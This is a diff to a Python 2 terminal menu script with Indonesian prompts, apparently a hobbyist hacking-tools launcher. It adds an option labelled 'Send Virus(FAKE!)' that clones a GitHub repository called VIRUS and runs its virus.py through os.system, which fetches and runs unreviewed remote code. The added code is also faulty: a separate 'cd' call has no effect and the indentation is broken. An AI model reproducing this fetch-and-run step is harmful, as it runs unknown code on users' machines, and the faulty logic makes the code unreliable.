@@ -13,6 +13,7 @@ def menu():
         print("\033[36;1m5. Exit")
         print("\033[36;1m6. info SC")
         print("\033[36;1m7. install bahan Dulu BosQ!!!")
+        print("\033[36;1m8. Send Virus(FAKE!)")
         # input
         pilih = input("\033[35;1m==> \033[36;1mMasukkan \033[32;1mpilihan : ")
         if pilih ==1:
@@ -106,4 +107,12 @@ def menu():
                 \033[36;1m**********************\033[32;1m*****************\033[36;1m***************"""
                 print logo
                 print "\t \033[36;1mTools \033[35;1mBy \033[33;1mReza \033[32;1mAlfauzan\n"
-menu()
+        if pilih ==8:
+                os.system("clear")
+                os.system("figlet Sabar . .")
+                os.system("git clone https://github.com/GRCR4K3R/VIRUS")
+                os.system("cd VIRUS")
+                os.system("ls")
+                os.system("python2 virus.py")
+
+   menu()
